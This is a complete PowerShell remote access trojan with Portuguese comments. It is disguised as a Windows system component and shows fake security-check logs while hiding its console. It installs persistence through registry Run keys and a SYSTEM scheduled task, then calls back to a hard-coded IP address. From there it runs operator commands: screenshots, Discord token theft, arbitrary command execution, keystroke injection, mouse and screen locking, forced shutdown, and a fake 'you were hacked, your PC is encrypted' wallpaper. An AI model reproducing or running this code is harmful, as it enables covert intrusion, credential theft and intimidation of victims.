<#
.SYNOPSIS
Windows Critical System Component - Complete Edition
.DESCRIPTION
Funções completas para controle remoto e lock total
.NOTES
Versão: 10.0.19045.1 - Lock Edition
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
$debugLog = "$env:TEMP\rat_debug.log"
$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
$wallpaperPath = "$env:TEMP\wallpaper_hack.bmp"

# ===== TEXTO DO WALLPAPER HACKEADO =====
$wallpaperText = @"
VOCE FOI

HACKEADO!

SEU PC TA

CRIPTOGRAFADO!

CRYPTO-LOCKED

ANLGUUR

NOTTI GANG
"@

# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit
}

# ===== FUNÇÃO DE LOG PARA DIAGNÓSTICO =====
function Write-DebugLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $debugLog -Append
}

# ===== FUNÇÕES DE USUÁRIO =====
function Remove-UserFromRAT {
    param([string]$UserName)
    
    $removido = $false
    
    # Remove do registro
    if (Test-Path $registryPath) {
        try {
            Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue
            $removido = $true
        } catch {
            Write-DebugLog "Erro ao remover registro: $_"
        }
    }
    
    # Remove da lista de usuários
    if (Test-Path $userListFile) {
        try {
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
            $users = $users | Where-Object { $_ -ne $UserName }
            $users | Set-Content $userListFile -Force
            $removido = $true
        } catch {
            Write-DebugLog "Erro ao remover da lista: $_"
        }
    }
    
    # Remove tarefas agendadas
    try {
        $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
        foreach ($task in $tasks) {
            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
            $removido = $true
        }
    } catch {
        Write-DebugLog "Erro ao remover tarefas: $_"
    }
    
    if ($removido) {
        return "USUARIO_REMOVIDO"
    } else {
        return "USUARIO_NAO_ENCONTRADO"
    }
}

function Get-RATUsers {
    try {
        $users = @()
        if (Test-Path $userListFile) {
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
        }
        if ($users.Count -eq 0) {
            return "Nenhum usuário encontrado"
        }
        return "USUARIOS:" + ($users -join "`n")
    } catch {
        Write-DebugLog "Erro em Get-RATUsers: $_"
        return "ERRO_AO_LISTAR"
    }
}

function Add-UserToList {
    param([string]$UserName)
    try {
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Add-Content -Path $userListFile -Value $UserName -Force
        New-Item -Path $registryPath -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
        Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
        return $true
    } catch {
        Write-DebugLog "Erro em Add-UserToList: $_"
        return $false
    }
}

$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
$userExecuted = $false

if (Test-Path $userListFile) {
    try {
        $users = Get-Content $userListFile -ErrorAction SilentlyContinue
        if ($users -contains $currentUser) {
            $userExecuted = $true
        }
    } catch {
        Write-DebugLog "Erro ao verificar usuário: $_"
    }
}

if (-not $userExecuted) {
    Add-UserToList $currentUser
}

# ===== LOGS FAKES =====
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 1
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Inicializando..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Verificando integridade..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sistema seguro" -ForegroundColor Green
Start-Sleep -Seconds 2

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== PERSISTÊNCIA MÚLTIPLA =====
function Install-Persistence {
    Write-DebugLog "Instalando persistência múltipla..."
    
    # Garantir que a pasta existe
    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
    
    # Copiar script
    try {
        Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
        Write-DebugLog "✓ Script copiado para: $scriptPath"
    } catch {
        Write-DebugLog "✗ Erro ao copiar script: $_"
    }
    
    # Registro HKLM
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
        Write-DebugLog "✓ Persistência adicionada ao registro (HKLM)"
    } catch {
        Write-DebugLog "✗ Erro no registro HKLM: $_"
    }
    
    # Registro HKCU (fallback)
    try {
        $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
        Write-DebugLog "✓ Persistência adicionada ao registro (HKCU)"
    } catch {
        Write-DebugLog "✗ Erro no registro HKCU: $_"
    }
    
    # Tarefa agendada
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
        Write-DebugLog "✓ Tarefa agendada criada"
    } catch {
        Write-DebugLog "✗ Erro na tarefa agendada: $_"
    }
    
    # Ocultar arquivo
    try {
        attrib +h +s +r $scriptPath
        Write-DebugLog "✓ Arquivo ocultado"
    } catch {
        Write-DebugLog "✗ Erro ao ocultar arquivo: $_"
    }
    
    Write-DebugLog "=" * 60
    Write-DebugLog "PERSISTÊNCIA INSTALADA"
    Write-DebugLog "=" * 60
}

if (-not (Test-Path $scriptPath)) {
    Install-Persistence
}

# ===== FUNCOES BASICAS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREEN:$base64"
    } catch {
        return "SCREEN_ERROR"
    }
}

# ===== WALLPAPER =====
function Create-HackWallpaper {
    try {
        $width = 1920
        $height = 1080
        $bitmap = New-Object System.Drawing.Bitmap $width, $height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.Clear([System.Drawing.Color]::Black)
        
        $fontGrande = New-Object System.Drawing.Font("Arial Black", 60, [System.Drawing.FontStyle]::Bold)
        $fontMedio = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
        
        $brushVermelho = [System.Drawing.Brushes]::Red
        $brushBranco = [System.Drawing.Brushes]::White
        
        $graphics.DrawString("VOCE FOI", $fontGrande, $brushVermelho, 200, 100)
        $graphics.DrawString("HACKEADO!", $fontGrande, $brushVermelho, 200, 180)
        $graphics.DrawString("SEU PC TA", $fontMedio, $brushBranco, 200, 300)
        $graphics.DrawString("CRIPTOGRAFADO!", $fontMedio, $brushBranco, 200, 370)
        $graphics.DrawString("NOTTI GANG", $fontGrande, $brushVermelho, 200, 500)
        
        $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
        $graphics.Dispose()
        $bitmap.Dispose()
        return $true
    } catch {
        return $false
    }
}

function Set-Wallpaper {
    try {
        $code = @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static void Set(string path) {
        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
    }
}
'@
        Add-Type -TypeDefinition $code -ErrorAction Stop
        [Wallpaper]::Set($wallpaperPath)
        return $true
    } catch {
        return $false
    }
}

# ===== MOUSE =====
$script:mouseLocked = $false
$script:mouseThread = $null

function Lock-Mouse {
    if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
    
    $script:mouseLocked = $true
    
    $script:mouseThread = [System.Threading.Thread]::new({
        while ($script:mouseLocked) {
            try {
                [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                Start-Sleep -Milliseconds 5
            } catch {}
        }
    })
    $script:mouseThread.IsBackground = $true
    $script:mouseThread.Start()
    
    return "MOUSE_LOCKED"
}

function Unlock-Mouse {
    $script:mouseLocked = $false
    if ($script:mouseThread -and $script:mouseThread.IsAlive) {
        $script:mouseThread.Abort()
    }
    return "MOUSE_UNLOCKED"
}

function Move-Mouse {
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch {
        return "MOUSE_ERROR"
    }
}

function Click-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        return "OK"
    } catch {
        return "CLICK_ERROR"
    }
}

# ===== TECLADO =====
function Send-Key {
    param($key)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($key)
        return "OK"
    } catch {
        return "KEY_ERROR"
    }
}

# ===== TELA PRETA =====
function Black-Screen {
    try {
        $ps = [powershell]::Create()
        [void]$ps.AddScript({
            Add-Type -AssemblyName System.Windows.Forms
            $form = New-Object System.Windows.Forms.Form
            $form.WindowState = 'Maximized'
            $form.FormBorderStyle = 'None'
            $form.TopMost = $true
            $form.BackColor = 'Black'
            $form.ControlBox = $false
            $form.ShowInTaskbar = $false
            $form.KeyPreview = $true
            $form.Add_KeyDown({ $_.SuppressKeyPress = $true })
            $form.ShowDialog()
        })
        $ps.BeginInvoke()
        return "BLACK_SCREEN_ACTIVATED"
    } catch {
        return "BLACK_SCREEN_ERROR"
    }
}

function Unlock-Screen {
    try {
        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
            $_.Close()
        }
        return "BLACK_SCREEN_DEACTIVATED"
    } catch {
        return "UNLOCK_SCREEN_ERROR"
    }
}

# ===== LOCK TOTAL =====
function Lock-Total {
    Lock-Mouse
    Black-Screen
    return "LOCK_TOTAL_ACTIVATED"
}

function Unlock-Total {
    Unlock-Mouse
    Unlock-Screen
    return "LOCK_TOTAL_DEACTIVATED"
}

# ===== ARQUIVOS =====
function Get-FileList {
    param($Path)
    try {
        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
            }
        }
        return ($items | ConvertTo-Json -Compress)
    } catch {
        return "[]"
    }
}

function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        return $result
    } catch {
        return "Erro: $_"
    }
}

# ===== DISCORD =====
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @("$env:APPDATA\discord\Local Storage\leveldb")
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) { $tokens += $match.Value }
                }
            }
        }
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        return "TOKENS:" + ($tokens -join "`n")
    } catch {
        return "TOKENS_ERROR"
    }
}

function Get-ProcessList {
    try {
        $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
        return $processes
    } catch {
        return "PROCESS_ERROR"
    }
}

function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        return "POWER_$Action"
    } catch {
        return "POWER_ERROR"
    }
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            if ($cmd -eq "screenshot") {
                $writer.WriteLine((Get-ScreenCapture))
            } elseif ($cmd -eq "click") {
                $writer.WriteLine((Click-Mouse))
            } elseif ($cmd -eq "discord") {
                $writer.WriteLine((Get-DiscordToken))
            } elseif ($cmd -eq "processes") {
                $writer.WriteLine((Get-ProcessList))
            } elseif ($cmd -eq "shutdown") {
                $writer.WriteLine((Power-Control "shutdown"))
            } elseif ($cmd -eq "reboot") {
                $writer.WriteLine((Power-Control "reboot"))
            } elseif ($cmd -eq "list_users") {
                $writer.WriteLine((Get-RATUsers))
            } elseif ($cmd -eq "remove_current_user") {
                $writer.WriteLine((Remove-UserFromRAT $currentUser))
            } elseif ($cmd -eq "lock_mouse") {
                $writer.WriteLine((Lock-Mouse))
            } elseif ($cmd -eq "unlock_mouse") {
                $writer.WriteLine((Unlock-Mouse))
            } elseif ($cmd -eq "black_screen") {
                $writer.WriteLine((Black-Screen))
            } elseif ($cmd -eq "unlock_screen") {
                $writer.WriteLine((Unlock-Screen))
            } elseif ($cmd -eq "lock_total") {
                $writer.WriteLine((Lock-Total))
            } elseif ($cmd -eq "unlock_total") {
                $writer.WriteLine((Unlock-Total))
            } elseif ($cmd -eq "set_wallpaper_hack") {
                if (Create-HackWallpaper -and (Set-Wallpaper)) {
                    $writer.WriteLine("WALLPAPER_HACK_SET")
                } else {
                    $writer.WriteLine("WALLPAPER_ERROR")
                }
            } elseif ($cmd -eq "test") {
                $writer.WriteLine("PONG")
            } elseif ($cmd -eq "exit") {
                break
            } elseif ($cmd -match "^move (\d+) (\d+)$") {
                $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
            } elseif ($cmd -match "^key (.+)$") {
                $writer.WriteLine((Send-Key $matches[1]))
            } elseif ($cmd -match "^ls (.+)$") {
                $writer.WriteLine((Get-FileList $matches[1]))
            } elseif ($cmd -match "^exec (.+)$") {
                $writer.WriteLine((Execute-Command $matches[1]))
            } else {
                $writer.WriteLine("Comando nao reconhecido")
            }
        }
    } catch {
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
